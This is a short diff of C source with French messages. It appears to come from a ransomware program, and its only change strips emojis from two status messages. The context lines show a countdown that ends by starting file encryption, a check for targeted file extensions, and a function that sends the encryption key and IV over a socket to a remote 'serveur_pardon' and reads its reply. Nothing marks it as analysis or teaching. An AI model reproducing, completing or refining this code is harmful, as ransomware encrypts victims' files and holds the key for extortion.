@@ -47,7 +47,7 @@ void attendre_delai(int secondes) {
         fflush(stdout);
         sleep(1);
     }
-    printf("\n🚨 Délai écoulé. Début du chiffrement...\n");
+    printf("\n Délai écoulé. Début du chiffrement...\n");
 }
 
 // Vérifie si l'extension est ciblée
@@ -206,7 +206,7 @@ void envoyer_cle_au_serveur(const char *ip, int port,
 
     write(sock, message, strlen(message));
     
-    printf("📤 Clé/IV envoyées au serveur_pardon.\n");
+    printf(" Clé/IV envoyées au serveur_pardon.\n");
 
     char reponse[100] = {0};
     read(sock, reponse, sizeof(reponse));
